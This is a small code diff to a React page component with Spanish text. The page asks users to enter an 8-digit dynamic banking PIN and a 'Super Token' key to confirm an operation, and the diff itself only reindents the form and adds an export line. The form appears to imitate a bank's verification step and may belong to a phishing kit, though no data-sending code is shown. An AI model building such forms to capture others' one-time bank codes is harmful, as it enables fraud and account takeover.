@@ -62,7 +62,7 @@ function Segundapag() {
           <div className="auth-progress-bar-fill"></div>
         </div>
       </div>
-      <form className="auth-form" onSubmit={handleSubmit}>
+    <form className="auth-form" onSubmit={handleSubmit}>
   <label>
     Por tu seguridad, confirma esta operación con el NIP dinámico de 8 dígitos que genera Supermóvil:
     <input 
@@ -90,3 +90,5 @@ function Segundapag() {
     <p style={{ fontSize: '12px', color: '#555' }}>3. Ingresa tu clave de Super Token para obtener el NIP dinámico.</p>
   </div>
 </form>
+
+      export default Segundapag;
